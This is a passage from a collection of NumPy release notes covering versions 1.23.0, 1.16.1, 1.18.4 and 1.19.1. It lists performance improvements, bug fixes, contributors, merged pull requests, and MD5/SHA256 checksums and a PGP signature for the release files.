contiguous integer-based arrays are now\nmuch faster.\n\n(`gh-21001 <https://github.com/numpy/numpy/pull/21001>`__)\n\nFaster ``np.where``\n-------------------\n``numpy.where`` is now much faster than previously on unpredictable/random\ninput data.\n\n(`gh-21130 <https://github.com/numpy/numpy/pull/21130>`__)\n\nFaster operations on NumPy scalars\n----------------------------------\nMany operations on NumPy scalars are now significantly faster, although\nrare operations (e.g. with 0-D arrays rather than scalars) may be slower\nin some cases.\nHowever, even with these improvements users who want the best performance\nfor their scalars, may want to convert a known NumPy scalar into a Python\none using ``scalar.item()``.\n\n(`gh-21188 <https://github.com/numpy/numpy/pull/21188>`__)\n\nFaster ``np.kron``\n------------------\n``numpy.kron`` is about 80% faster as the product is now computed\nusing broadcasting.\n\n(`gh-21354 <https://github.com/numpy/numpy/pull/21354>`__)\n\nChecksums\n=========\n\nMD5\n---\n::\n\n    21839aaeab3088e685d7c8d0e1856a23  numpy-1.23.0-cp310-cp310-macosx_10_9_x86_64.whl\n    e657684ea521c50de0197aabfb44e78d  numpy-1.23.0-cp310-cp310-macosx_11_0_arm64.whl\n    219017660861fdec59b852630e3fef2a  numpy-1.23.0-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    03c3df83b8327910482a7d24ebe9213b  numpy-1.23.0-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    b8f06ce4054acc147845a9643bd36082  numpy-1.23.0-cp310-cp310-win32.whl\n    877322db5a62634eef4e351db99a070d  numpy-1.23.0-cp310-cp310-win_amd64.whl\n    7bb54f95e74306eff733466b6343695f  numpy-1.23.0-cp38-cp38-macosx_10_9_x86_64.whl\n    5514a0030e5cf065e916950737d6d129  numpy-1.23.0-cp38-cp38-macosx_11_0_arm64.whl\n    22d43465791814fe50e03ded430bd80c  numpy-1.23.0-cp38-cp38-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    771a1f7e488327645bac5b54dd2f6286  numpy-1.23.0-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    449bfa2d55aff3e722d2fc85a7549620  numpy-1.23.0-cp38-cp38-win32.whl\n    60c7d27cf92dadb6d206df6e65b1032f  numpy-1.23.0-cp38-cp38-win_amd64.whl\n    dc2a5c5d2223f7b45a45f7f760d0f2db  numpy-1.23.0-cp39-cp39-macosx_10_9_x86_64.whl\n    ba5729353c3521ed7ee72c796e77a546  numpy-1.23.0-cp39-cp39-macosx_11_0_arm64.whl\n    06d5cd49de096482944dead2eb92d783  numpy-1.23.0-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    6ff50a994f6006349b5f1415e4da6f45  numpy-1.23.0-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    49185f219512403ef23d43d6f2adbefd  numpy-1.23.0-cp39-cp39-win32.whl\n    ff126a84dcf91700f9ca13ff606d109f  numpy-1.23.0-cp39-cp39-win_amd64.whl\n    e1462428487dc599cdffb723dec642c4  numpy-1.23.0-pp38-pypy38_pp73-macosx_10_9_x86_64.whl\n    fef1d20265135737fbc0f91ca4441990  numpy-1.23.0-pp38-pypy38_pp73-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    4f8142288202a32c682d01921d6c2c78  numpy-1.23.0-pp38-pypy38_pp73-win_amd64.whl\n    513e4241d06b8fae5732cd049cdf3b57  numpy-1.23.0.tar.gz\n\nSHA256\n------\n::\n\n    58bfd40eb478f54ff7a5710dd61c8097e169bc36cc68333d00a9bcd8def53b38  numpy-1.23.0-cp310-cp310-macosx_10_9_x86_64.whl\n    196cd074c3f97c4121601790955f915187736f9cf458d3ee1f1b46aff2b1ade0  numpy-1.23.0-cp310-cp310-macosx_11_0_arm64.whl\n    f1d88ef79e0a7fa631bb2c3dda1ea46b32b1fe614e10fedd611d3d5398447f2f  numpy-1.23.0-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    d54b3b828d618a19779a84c3ad952e96e2c2311b16384e973e671aa5be1f6187  numpy-1.23.0-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    2b2da66582f3a69c8ce25ed7921dcd8010d05e59ac8d89d126a299be60421171  numpy-1.23.0-cp310-cp310-win32.whl\n    97a76604d9b0e79f59baeca16593c711fddb44936e40310f78bfef79ee9a835f  numpy-1.23.0-cp310-cp310-win_amd64.whl\n    d8cc87bed09de55477dba9da370c1679bd534df9baa171dd01accbb09687dac3  numpy-1.23.0-cp38-cp38-macosx_10_9_x86_64.whl\n    f0f18804df7370571fb65db9b98bf1378172bd4e962482b857e612d1fec0f53e  numpy-1.23.0-cp38-cp38-macosx_11_0_arm64.whl\n    ac86f407873b952679f5f9e6c0612687e51547af0e14ddea1eedfcb22466babd  numpy-1.23.0-cp38-cp38-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    ae8adff4172692ce56233db04b7ce5792186f179c415c37d539c25de7298d25d  numpy-1.23.0-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    fe8b9683eb26d2c4d5db32cd29b38fdcf8381324ab48313b5b69088e0e355379  numpy-1.23.0-cp38-cp38-win32.whl\n    5043bcd71fcc458dfb8a0fc5509bbc979da0131b9d08e3d5f50fb0bbb36f169a  numpy-1.23.0-cp38-cp38-win_amd64.whl\n    1c29b44905af288b3919803aceb6ec7fec77406d8b08aaa2e8b9e63d0fe2f160  numpy-1.23.0-cp39-cp39-macosx_10_9_x86_64.whl\n    98e8e0d8d69ff4d3fa63e6c61e8cfe2d03c29b16b58dbef1f9baa175bbed7860  numpy-1.23.0-cp39-cp39-macosx_11_0_arm64.whl\n    79a506cacf2be3a74ead5467aee97b81fca00c9c4c8b3ba16dbab488cd99ba10  numpy-1.23.0-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    092f5e6025813e64ad6d1b52b519165d08c730d099c114a9247c9bb635a2a450  numpy-1.23.0-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    d6ca8dabe696c2785d0c8c9b0d8a9b6e5fdbe4f922bde70d57fa1a2848134f95  numpy-1.23.0-cp39-cp39-win32.whl\n    fc431493df245f3c627c0c05c2bd134535e7929dbe2e602b80e42bf52ff760bc  numpy-1.23.0-cp39-cp39-win_amd64.whl\n    f9c3fc2adf67762c9fe1849c859942d23f8d3e0bee7b5ed3d4a9c3eeb50a2f07  numpy-1.23.0-pp38-pypy38_pp73-macosx_10_9_x86_64.whl\n    d0d2094e8f4d760500394d77b383a1b06d3663e8892cdf5df3c592f55f3bff66  numpy-1.23.0-pp38-pypy38_pp73-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    94b170b4fa0168cd6be4becf37cb5b127bd12a795123984385b8cd4aca9857e5  numpy-1.23.0-pp38-pypy38_pp73-win_amd64.whl\n    bd3fa4fe2e38533d5336e1272fc4e765cabbbde144309ccee8675509d5cd7b05  numpy-1.23.0.tar.gz\n", "1.16.1": "==========================\n\nThe NumPy 1.16.1 release fixes bugs reported against the 1.16.0 release, and\nalso backports several enhancements from master that seem appropriate for a\nrelease series that is the last to support Python 2.7. The wheels on PyPI are\nlinked with OpenBLAS v0.3.4+,  which should fix the known threading issues\nfound in previous OpenBLAS versions.\n\nDownstream developers building this release should use Cython >= 0.29.2 and, if\nusing OpenBLAS, OpenBLAS > v0.3.4.\n\nIf you are installing using pip, you may encounter a problem with older\ninstalled versions of NumPy that pip did not delete becoming mixed with the\ncurrent version, resulting in an ``ImportError``. That problem is particularly\ncommon on Debian derived distributions due to a modified pip.  The fix is to\nmake sure all previous NumPy versions installed by pip have been removed. See\n`12736 <https://github.com/numpy/numpy/issues/12736>`__ for discussion of the\nissue. Note that previously this problem resulted in an ``AttributeError``.\n\n\nContributors\n============\n\nA total of 16 people contributed to this release.  People with a \"+\" by their\nnames contributed a patch for the first time.\n\n* Antoine Pitrou\n* Arcesio Castaneda Medina +\n* Charles Harris\n* Chris Markiewicz +\n* Christoph Gohlke\n* Christopher J. Markiewicz +\n* Daniel Hrisca +\n* EelcoPeacs +\n* Eric Wieser\n* Kevin Sheppard\n* Matti Picus\n* OBATA Akio +\n* Ralf Gommers\n* Sebastian Berg\n* Stephan Hoyer\n* Tyler Reddy\n\n\nEnhancements\n============\n\n* `12767 <https://github.com/numpy/numpy/pull/12767>`__: ENH: add mm->q floordiv\n* `12768 <https://github.com/numpy/numpy/pull/12768>`__: ENH: port np.core.overrides to C for speed\n* `12769 <https://github.com/numpy/numpy/pull/12769>`__: ENH: Add np.ctypeslib.as_ctypes_type(dtype), improve `np.ctypeslib.as_ctypes`\n* `12773 <https://github.com/numpy/numpy/pull/12773>`__: ENH: add \"max difference\" messages to np.testing.assert_array_equal...\n* `12820 <https://github.com/numpy/numpy/pull/12820>`__: ENH: Add mm->qm divmod\n* `12890 <https://github.com/numpy/numpy/pull/12890>`__: ENH: add _dtype_ctype to namespace for freeze analysis\n\n\nCompatibility notes\n===================\n\n* The changed error message emited by array comparison testing functions may\n  affect doctests. See below for detail.\n\n* Casting from double and single denormals to float16 has been corrected.  In\n  some rare cases, this may result in results being rounded up instead of down,\n  changing the last bit (ULP) of the result.\n\n\nNew Features\n============\n\ndivmod operation is now supported for two ``timedelta64`` operands\n- ------------------------------------------------------------------\nThe divmod operator now handles two ``np.timedelta64`` operands, with\ntype signature ``mm->qm``.\n\n\nImprovements\n============\n\nFurther improvements to ``ctypes`` support in ``np.ctypeslib``\n- --------------------------------------------------------------\nA new ``np.ctypeslib.as_ctypes_type`` function has been added, which can be\nused to converts a `dtype` into a best-guess `ctypes` type. Thanks to this\nnew function, ``np.ctypeslib.as_ctypes`` now supports a much wider range of\narray types, including structures, booleans, and integers of non-native\nendianness.\n\nArray comparison assertions include maximum differences\n- -------------------------------------------------------\nError messages from array comparison tests such as\n`np.testing.assert_allclose` now include \"max absolute difference\" and\n\"max relative difference,\" in addition to the previous \"mismatch\" percentage.\nThis information makes it easier to update absolute and relative error\ntolerances.\n\n\nChanges\n=======\n\n``timedelta64 % 0`` behavior adjusted to return ``NaT``\n- -------------------------------------------------------\nThe modulus operation with two ``np.timedelta64`` operands now returns\n``NaT`` in the case of division by zero, rather than returning zero\n\n\n\n\nChecksums\n=========\n\nMD5\n- ---\n\n    456aae0a43311da1570a53baef7f5620  numpy-1.16.1-cp27-cp27m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    8f39da654cd27a96877955a2fbf3883f  numpy-1.16.1-cp27-cp27m-manylinux1_i686.whl\n    add6fcaf9b5007dca2fc966b918d585e  numpy-1.16.1-cp27-cp27m-manylinux1_x86_64.whl\n    b2193c7af769169229eef8d2371929c2  numpy-1.16.1-cp27-cp27m-win32.whl\n    3a7eba56bcebc52b223d63ab4b9bf029  numpy-1.16.1-cp27-cp27m-win_amd64.whl\n    3bc676163ce4d526c8305bc889f0594d  numpy-1.16.1-cp27-cp27mu-manylinux1_i686.whl\n    55ccd6d343be1e16e70159714ac74848  numpy-1.16.1-cp27-cp27mu-manylinux1_x86_64.whl\n    15bebbeddc5924243a010680e184b6e8  numpy-1.16.1-cp35-cp35m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    86aacbea051b7542a8bd3486d2fa79cd  numpy-1.16.1-cp35-cp35m-manylinux1_i686.whl\n    486ce91fd66ec19044d8faa7d00e619b  numpy-1.16.1-cp35-cp35m-manylinux1_x86_64.whl\n    f2665475de0378467d88e6d80ac47f09  numpy-1.16.1-cp35-cp35m-win32.whl\n    42b9d99bf4b03e3e9ae7aee8cbdff97c  numpy-1.16.1-cp35-cp35m-win_amd64.whl\n    269c80fde767b2b65abec775171aebed  numpy-1.16.1-cp36-cp36m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    a9561d8a38ee7d52126dfe779429036d  numpy-1.16.1-cp36-cp36m-manylinux1_i686.whl\n    2d146e75063ce8aaa255ea06d6647fa2  numpy-1.16.1-cp36-cp36m-manylinux1_x86_64.whl\n    3a422881207202055c7530d3c4a63cc0  numpy-1.16.1-cp36-cp36m-win32.whl\n    641af9183978922d4eb610c0df1abb4a  numpy-1.16.1-cp36-cp36m-win_amd64.whl\n    8eca0834ffce217b61633a2ba16f9e98  numpy-1.16.1-cp37-cp37m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    df387b8e8ee398f2a6a46b18981ce7e3  numpy-1.16.1-cp37-cp37m-manylinux1_i686.whl\n    daaac731bf53b6f90bf381e30c0b0e35  numpy-1.16.1-cp37-cp37m-manylinux1_x86_64.whl\n    7443f622e549bf116ca561c1db6a4491  numpy-1.16.1-cp37-cp37m-win32.whl\n    18b7d994de469d38e26c75c27898fa4f  numpy-1.16.1-cp37-cp37m-win_amd64.whl\n    ae2e65a2f2d7c80a3264fb038157895c  numpy-1.16.1.tar.gz\n    dafda51934f645d888866f98424521ae  numpy-1.16.1.zip\n\nSHA256\n- ------\n\n    e9c88f173d31909d881a60f08a8494e63f1aff2a4052476b24d4f50e82c47e24  numpy-1.16.1-cp27-cp27m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    69c152f7c11bf3b4fc11bc4cc62eb0334371c0db6844ebace43b7c815b602805  numpy-1.16.1-cp27-cp27m-manylinux1_i686.whl\n    ae602ba425fb2b074e16d125cdce4f0194903da935b2e7fe284ebecca6d92e76  numpy-1.16.1-cp27-cp27m-manylinux1_x86_64.whl\n    4341a39fc085f31a583be505eabf00e17c619b469fef78dc7e8241385bfddaa4  numpy-1.16.1-cp27-cp27m-win32.whl\n    a863957192855c4c57f60a75a1ac06ce5362ad18506d362dd807e194b4baf3ce  numpy-1.16.1-cp27-cp27m-win_amd64.whl\n    62784b35df7de7ca4d0d81c5b6af5983f48c5cdef32fc3635b445674e56e3266  numpy-1.16.1-cp27-cp27mu-manylinux1_i686.whl\n    6ccfdcefd287f252cf1ea7a3f1656070da330c4a5658e43ad223269165cdf977  numpy-1.16.1-cp27-cp27mu-manylinux1_x86_64.whl\n    8bbee788d82c0ac656536de70e817af09b7694f5326b0ef08e5c1014fcb96bb3  numpy-1.16.1-cp35-cp35m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    f69dde0c5a137d887676a8129373e44366055cf19d1b434e853310c7a1e68f93  numpy-1.16.1-cp35-cp35m-manylinux1_i686.whl\n    575cefd28d3e0da85b0864506ae26b06483ee4a906e308be5a7ad11083f9d757  numpy-1.16.1-cp35-cp35m-manylinux1_x86_64.whl\n    45080f065dcaa573ebecbfe13cdd86e8c0a68c4e999aa06bd365374ea7137706  numpy-1.16.1-cp35-cp35m-win32.whl\n    34dd4922aab246c39bf5df03ca653d6265e65971deca6784c956bf356bca6197  numpy-1.16.1-cp35-cp35m-win_amd64.whl\n    c2c39d69266621dd7464e2bb740d6eb5abc64ddc339cc97aa669f3bb4d75c103  numpy-1.16.1-cp36-cp36m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    392e2ea22b41a22c0289a88053204b616181288162ba78e6823e1760309d5277  numpy-1.16.1-cp36-cp36m-manylinux1_i686.whl\n    7298fbd73c0b3eff1d53dc9b9bdb7add8797bb55eeee38c8ccd7906755ba28af  numpy-1.16.1-cp36-cp36m-manylinux1_x86_64.whl\n    384e2dfa03da7c8d54f8f934f61b6a5e4e1ebb56a65b287567629d6c14578003  numpy-1.16.1-cp36-cp36m-win32.whl\n    2b0cca1049bd39d1879fa4d598624cafe82d35529c72de1b3d528d68031cdd95  numpy-1.16.1-cp36-cp36m-win_amd64.whl\n    b13faa258b20fa66d29011f99fdf498641ca74a0a6d9266bc27d83c70fea4a6a  numpy-1.16.1-cp37-cp37m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    485cb1eb4c9962f4cd042fed9424482ec1d83fee5dc2ef3f2552ac47852cb259  numpy-1.16.1-cp37-cp37m-manylinux1_i686.whl\n    0cdbbaa30ae69281b18dd995d3079c4e552ad6d5426977f66b9a2a95f11f552a  numpy-1.16.1-cp37-cp37m-manylinux1_x86_64.whl\n    79463d918d1bf3aeb9186e3df17ddb0baca443f41371df422f99ee94f4f2bbfe  numpy-1.16.1-cp37-cp37m-win32.whl\n    f1a29267ac29fff0913de0f11f3a9edfcd3f39595f467026c29376fad243ebe3  numpy-1.16.1-cp37-cp37m-win_amd64.whl\n    748369f4d5f60caf93e1d86cb22ad7fc5f82693f18804638f22bc55df27792ec  numpy-1.16.1.tar.gz\n    31d3fe5b673e99d33d70cfee2ea8fe8dccd60f265c3ed990873a88647e3dd288  numpy-1.16.1.zip\n-----BEGIN PGP SIGNATURE-----\n\niQEcBAEBAgAGBQJcU382AAoJEGefIoN3xSR7EzcH/1HfUS3xop0OM/Mon+H33ydc\nMUA1tb1tKmkRP5dlzFsv+1g3daGV6q9rI2ihpy9siSZO/MaaXuepnbxovOhenaSc\n9QxXgUtu17Lie9gpRZWn36Je7E/tS3oEQ+7Yk5OpURXEyyW/8EO1fsiO/bbQPnkG\np//G0ZJCQ1vXIaU+bUqKbFTh1sQG1DH/fS7/+6IitVevlXo4jXeWO6WdXKS2IfUj\nc9ZNfaPuIQhT0OnlDt6LfOHYyLoGSb0tSNfIfBp8Rc0+AEGDf2Cp8aj7K0seuHwZ\nJxgaDbHfpX0gSddUwW5Qz+mI1cfuMZjJJpGtMzFLFj+q4cG3n3Nqor/tXS3qgRM=\n=BYMN\n-----END PGP SIGNATURE-----\n\n\n==========================\n", "1.18.4": "==========================\n\nThis is that last planned release in the 1.18.x series. It reverts the\n``bool(\"0\")`` behavior introduced in 1.18.3 and fixes a bug in\n``Generator.integers``. There is also improved help in the error message\nemitted when numpy import fails due to a link to a new troubleshooting section\nin the documentation that is now included. \n\nThe Python versions supported in this release are 3.5-3.8. Downstream\ndevelopers should use Cython >= 0.29.15 for Python 3.8 support and OpenBLAS >=\n3.7 to avoid errors on the Skylake architecture.\n\nContributors\n============\n\nA total of 4 people contributed to this release.  People with a \"+\" by their\nnames contributed a patch for the first time.\n\n* Charles Harris\n* Matti Picus\n* Sebastian Berg\n* Warren Weckesser\n\nPull requests merged\n====================\n\nA total of 6 pull requests were merged for this release.\n\n* `16055 <https://github.com/numpy/numpy/pull/16055>`__: BLD: add i686 for 1.18 builds\n* `16090 <https://github.com/numpy/numpy/pull/16090>`__: BUG: random: ``Generator.integers(2**32)`` always returned 0.\n* `16091 <https://github.com/numpy/numpy/pull/16091>`__: BLD: fix path to libgfortran on macOS\n* `16109 <https://github.com/numpy/numpy/pull/16109>`__: REV: Reverts side-effect changes to casting\n* `16114 <https://github.com/numpy/numpy/pull/16114>`__: BLD: put openblas library in local directory on windows\n* `16132 <https://github.com/numpy/numpy/pull/16132>`__: DOC: Change import error \"howto\" to link to new troubleshooting...\n\nChecksums\n=========\n\nMD5\n---\n::\n\n    1fe09153c9e6da5c9e73f3ed466da50c  numpy-1.18.4-cp35-cp35m-macosx_10_9_intel.whl\n    707b0270ece3e9a16905e756884daa48  numpy-1.18.4-cp35-cp35m-manylinux1_i686.whl\n    47f90c71c3df80ace2b32d011ed1c240  numpy-1.18.4-cp35-cp35m-manylinux1_x86_64.whl\n    e0e7d9fd9f4c8cf077ba5cda69833d38  numpy-1.18.4-cp35-cp35m-win32.whl\n    06e844091463932a0d4da103951ffc2c  numpy-1.18.4-cp35-cp35m-win_amd64.whl\n    32ce3d6d266f1fbfef4a2ff917053718  numpy-1.18.4-cp36-cp36m-macosx_10_9_x86_64.whl\n    f5d27cca8bf9dc8f603cad5255674bb8  numpy-1.18.4-cp36-cp36m-manylinux1_i686.whl\n    460bd10297e582f0e061194356990afb  numpy-1.18.4-cp36-cp36m-manylinux1_x86_64.whl\n    160c62c881a5109f3e47813dd0079ab1  numpy-1.18.4-cp36-cp36m-win32.whl\n    03e2d39bfaaf27993b353b98c75f27cc  numpy-1.18.4-cp36-cp36m-win_amd64.whl\n    672cb3889e7c9285ca260f8d15c2bc9f  numpy-1.18.4-cp37-cp37m-macosx_10_9_x86_64.whl\n    eaebca109ce5346ec1626af476e88edb  numpy-1.18.4-cp37-cp37m-manylinux1_i686.whl\n    bdf6d9bd169e5552284dd366c12e3759  numpy-1.18.4-cp37-cp37m-manylinux1_x86_64.whl\n    408f8eedcfb8bee6c0d8cb13f4665edd  numpy-1.18.4-cp37-cp37m-win32.whl\n    2d2cc2ccd5c276bde6696856609dee9f  numpy-1.18.4-cp37-cp37m-win_amd64.whl\n    5bdfaa2daf5afd8e6db8c202f58d5ef0  numpy-1.18.4-cp38-cp38-macosx_10_9_x86_64.whl\n    1aad5b0c4545e206aae7848853633885  numpy-1.18.4-cp38-cp38-manylinux1_i686.whl\n    f7e78dcee83fb851c97804d7fb987fdb  numpy-1.18.4-cp38-cp38-manylinux1_x86_64.whl\n    91678301ec0d6e6c20bf7c71bc8665a5  numpy-1.18.4-cp38-cp38-win32.whl\n    916b27fca6fb780907033067cad175fe  numpy-1.18.4-cp38-cp38-win_amd64.whl\n    70e6c294f8dffa8d630eda1b0d42ae4d  numpy-1.18.4.tar.gz\n    37277c5cbe5a850513fbff5ffdad1caf  numpy-1.18.4.zip\n\nSHA256\n------\n::\n\n    efdba339fffb0e80fcc19524e4fdbda2e2b5772ea46720c44eaac28096d60720  numpy-1.18.4-cp35-cp35m-macosx_10_9_intel.whl\n    2b573fcf6f9863ce746e4ad00ac18a948978bb3781cffa4305134d31801f3e26  numpy-1.18.4-cp35-cp35m-manylinux1_i686.whl\n    3f0dae97e1126f529ebb66f3c63514a0f72a177b90d56e4bce8a0b5def34627a  numpy-1.18.4-cp35-cp35m-manylinux1_x86_64.whl\n    dccd380d8e025c867ddcb2f84b439722cf1f23f3a319381eac45fd077dee7170  numpy-1.18.4-cp35-cp35m-win32.whl\n    02ec9582808c4e48be4e93cd629c855e644882faf704bc2bd6bbf58c08a2a897  numpy-1.18.4-cp35-cp35m-win_amd64.whl\n    904b513ab8fbcbdb062bed1ce2f794ab20208a1b01ce9bd90776c6c7e7257032  numpy-1.18.4-cp36-cp36m-macosx_10_9_x86_64.whl\n    e22cd0f72fc931d6abc69dc7764484ee20c6a60b0d0fee9ce0426029b1c1bdae  numpy-1.18.4-cp36-cp36m-manylinux1_i686.whl\n    2466fbcf23711ebc5daa61d28ced319a6159b260a18839993d871096d66b93f7  numpy-1.18.4-cp36-cp36m-manylinux1_x86_64.whl\n    00d7b54c025601e28f468953d065b9b121ddca7fff30bed7be082d3656dd798d  numpy-1.18.4-cp36-cp36m-win32.whl\n    7d59f21e43bbfd9a10953a7e26b35b6849d888fc5a331fa84a2d9c37bd9fe2a2  numpy-1.18.4-cp36-cp36m-win_amd64.whl\n    efb7ac5572c9a57159cf92c508aad9f856f1cb8e8302d7fdb99061dbe52d712c  numpy-1.18.4-cp37-cp37m-macosx_10_9_x86_64.whl\n    0e6f72f7bb08f2f350ed4408bb7acdc0daba637e73bce9f5ea2b207039f3af88  numpy-1.18.4-cp37-cp37m-manylinux1_i686.whl\n    9933b81fecbe935e6a7dc89cbd2b99fea1bf362f2790daf9422a7bb1dc3c3085  numpy-1.18.4-cp37-cp37m-manylinux1_x86_64.whl\n    96dd36f5cdde152fd6977d1bbc0f0561bccffecfde63cd397c8e6033eb66baba  numpy-1.18.4-cp37-cp37m-win32.whl\n    57aea170fb23b1fd54fa537359d90d383d9bf5937ee54ae8045a723caa5e0961  numpy-1.18.4-cp37-cp37m-win_amd64.whl\n    ed722aefb0ebffd10b32e67f48e8ac4c5c4cf5d3a785024fdf0e9eb17529cd9d  numpy-1.18.4-cp38-cp38-macosx_10_9_x86_64.whl\n    50fb72bcbc2cf11e066579cb53c4ca8ac0227abb512b6cbc1faa02d1595a2a5d  numpy-1.18.4-cp38-cp38-manylinux1_i686.whl\n    709c2999b6bd36cdaf85cf888d8512da7433529f14a3689d6e37ab5242e7add5  numpy-1.18.4-cp38-cp38-manylinux1_x86_64.whl\n    f22273dd6a403ed870207b853a856ff6327d5cbce7a835dfa0645b3fc00273ec  numpy-1.18.4-cp38-cp38-win32.whl\n    1be2e96314a66f5f1ce7764274327fd4fb9da58584eaff00b5a5221edefee7d6  numpy-1.18.4-cp38-cp38-win_amd64.whl\n    e0781ec6627e85f2a618478ee278893343fb8b40577b4c74b2ec15c7a5b8f698  numpy-1.18.4.tar.gz\n    bbcc85aaf4cd84ba057decaead058f43191cc0e30d6bc5d44fe336dc3d3f4509  numpy-1.18.4.zip\n\n\n.. currentmodule:: numpy\n\n==========================\n", "1.19.1": "==========================\n\nNumPy 1.19.1 fixes several bugs found in the 1.19.0 release, replaces several\nfunctions deprecated in the upcoming Python-3.9 release, has improved support\nfor AIX, and has a number of development related updates to keep CI working\nwith recent upstream changes.\n\nThis release supports Python 3.6-3.8. Cython >= 0.29.21 needs to be used when\nbuilding with Python 3.9 for testing purposes.\n\n\nContributors\n============\n\nA total of 15 people contributed to this release.  People with a \"+\" by their\nnames contributed a patch for the first time.\n\n* Abhinav Reddy +\n* Anirudh Subramanian\n* Antonio Larrosa +\n* Charles Harris\n* Chunlin Fang\n* Eric Wieser\n* Etienne Guesnet +\n* Kevin Sheppard\n* Matti Picus\n* Raghuveer Devulapalli\n* Roman Yurchak\n* Ross Barnowski\n* Sayed Adel\n* Sebastian Berg\n* Tyler Reddy\n\n\nPull requests merged\n====================\n\nA total of 25 pull requests were merged for this release.\n\n* `16649 <https://github.com/numpy/numpy/pull/16649>`__: MAINT, CI: disable Shippable cache\n* `16652 <https://github.com/numpy/numpy/pull/16652>`__: MAINT: Replace PyUString_GET_SIZE with PyUnicode_GetLength.\n* `16654 <https://github.com/numpy/numpy/pull/16654>`__: REL: Fix outdated docs link\n* `16656 <https://github.com/numpy/numpy/pull/16656>`__: BUG: raise IEEE exception on AIX\n* `16672 <https://github.com/numpy/numpy/pull/16672>`__: BUG: Fix bug in AVX complex absolute while processing array of...\n* `16693 <https://github.com/numpy/numpy/pull/16693>`__: TST: Add extra debugging information to CPU features detection\n* `16703 <https://github.com/numpy/numpy/pull/16703>`__: BLD: Add CPU entry for Emscripten / WebAssembly\n* `16705 <https://github.com/numpy/numpy/pull/16705>`__: TST: Disable Python 3.9-dev testing.\n* `16714 <https://github.com/numpy/numpy/pull/16714>`__: MAINT: Disable use_hugepages in case of ValueError\n* `16724 <https://github.com/numpy/numpy/pull/16724>`__: BUG: Fix PyArray_SearchSorted signature.\n* `16768 <https://github.com/numpy/numpy/pull/16768>`__: MAINT: Fixes for deprecated functions in scalartypes.c.src\n* `16772 <https://github.com/numpy/numpy/pull/16772>`__: MAINT: Remove unneeded call to PyUnicode_READY\n* `16776 <https://github.com/numpy/numpy/pull/16776>`__: MAINT: Fix deprecated functions in scalarapi.c\n* `16779 <https://github.com/numpy/numpy/pull/16779>`__: BLD, ENH: Add RPATH support for AIX\n* `16780 <https://github.com/numpy/numpy/pull/16780>`__: BUG: Fix default fallback in genfromtxt\n* `16784 <https://github.com/numpy/numpy/pull/16784>`__: BUG: Added missing return after raising error in methods.c\n* `16795 <https://github.com/numpy/numpy/pull/16795>`__: BLD: update cython to 0.29.21\n* `16832 <https://github.com/numpy/numpy/pull/16832>`__: MAINT: setuptools 49.2.0 emits a warning, avoid it\n* `16872 <https://github.com/numpy/numpy/pull/16872>`__: BUG: Validate output size in bin- and multinomial\n* `16875 <https://github.com/numpy/numpy/pull/16875>`__: BLD, MAINT: Pin setuptools\n* `16904 <https://github.com/numpy/numpy/pull/16904>`__: DOC: Reconstruct Testing Guideline.\n* `16905 <https://github.com/numpy/numpy/pull/16905>`__: TST, BUG: Re-raise MemoryError exception in test_large_zip's...\n* `16906 <https://github.com/numpy/numpy/pull/16906>`__: BUG, DOC: Fix bad MPL kwarg.\n* `16916 <https://github.com/numpy/numpy/pull/16916>`__: BUG: Fix string/bytes to complex assignment\n* `16922 <https://github.com/numpy/numpy/pull/16922>`__: REL: Prepare for NumPy 1.19.1 release\n\nChecksums\n=========\n\nMD5\n---\n::\n\n    a57df319841a487b22b932aa99562fd8  numpy-1.19.1-cp36-cp36m-macosx_10_9_x86_64.whl\n    c86be0ba1efc221cdd3aba05c21ab7a6  numpy-1.19.1-cp36-cp36m-manylinux1_i686.whl\n    09bb5d4ff277bc2caddc107af963f006  numpy-1.19.1-cp36-cp36m-manylinux1_x86_64.whl\n    c150ffb56704ff319e8ea525773de49e  numpy-1.19.1-cp36-cp36m-manylinux2010_i686.whl\n    e7c22cfc5956330df8fc107968472e28  numpy-1.19.1-cp36-cp36m-manylinux2010_x86_64.whl\n    9255520a51c6aa591489f68ac7a4cb0e  numpy-1.19.1-cp36-cp36m-manylinux2014_aarch64.whl\n    7de3e77a0cda438724e1d8f312805742  numpy-1.19.1-cp36-cp36m-win32.whl\n    d6d00a2e7b5bbfa7f5f097e8f99d17a7  numpy-1.19.1-cp36-cp36m-win_amd64.whl\n    c8bc9f328f3a89ab35c374e9cf36dd80  numpy-1.19.1-cp37-cp37m-macosx_10_9_x86_64.whl\n    8e2eb1614b6a7ce286a5ddf39805564c  numpy-1.19.1-cp37-cp37m-manylinux1_i686.whl\n    884540e9a94a9da88cd35311a40e1f98  numpy-1.19.1-cp37-cp37m-manylinux1_x86_64.whl\n    c8dea76ce437f9795a2c38fc3a94cc64  